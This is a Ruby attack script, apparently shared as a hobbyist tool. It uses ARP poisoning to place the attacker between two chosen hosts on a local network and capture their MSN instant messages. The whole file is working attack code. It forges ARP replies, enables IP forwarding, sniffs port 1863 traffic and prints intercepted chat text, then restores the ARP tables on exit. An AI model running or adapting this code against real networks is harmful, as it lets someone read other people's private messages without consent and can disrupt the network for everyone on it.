#!/usr/bin/ruby -w
# by nobot (for educational purposes ... please feel free to improve)
# uses arp poisoning to sniff msn messages.
# supply your nic and the ip addresses of the targets you want to mitm.
# beware that screwing with arp might render the network useless

require 'rubyforger'
require 'pcap'

def get_arp(ip, mac, other_ip, other_mac)
    EthPkt.new("dst"=> mac) +
    ArpPkt.new("op"=>$ARPOP_REPLY, "sha"=>other_mac,
               "spa"=>other_ip,"tha"=>mac, "tpa"=>ip)
end

begin
    ARGV.size == 3 or raise 'perl arpvenom.rb dev ip_target1 ip_target2'
    init(my_dev = ARGV.shift)
    my_mac = $DEFAULT_MAC
    ips          = [ARGV.shift, ARGV.shift]
    macs      = [getmac(ips[0]), getmac(ips[1])]

    evil_arps = [get_arp(ips[0], macs[0], ips[1], my_mac),
                       get_arp(ips[1], macs[1], ips[0], my_mac)]
    nice_arps = [get_arp(ips[0], macs[0], ips[1], macs[1]),
                       get_arp(ips[1], macs[1], ips[0], macs[0])]

    pid = fork do
        cap = Pcaplet.new(" -s 1500 -i #{my_dev}")
        cap.add_filter(Pcap::Filter.new('tcp and port 1863', cap.capture))
        cap.each_packet do |pkt|
            data = pkt.tcp_data
            puts data if data =~ /MSG/ and data !~ /TypingUser:/
        end
        cap.close
    end

    do_poison = true
    trap('INT') { do_poison = false} #shut down gently
    %x[echo 1 > /proc/sys/net/ipv4/ip_forward]
    while do_poison
        evil_arps.each { |reply| reply.send }
        15.times { break unless do_poison and sleep 2 }
    end

    nice_arps.each { |reply| reply.send } #heal the victims
    %x[echo 0 > /proc/sys/net/ipv4/ip_forward]
    Process.kill('TERM', pid)
    Process.wait

rescue
    puts $!
end 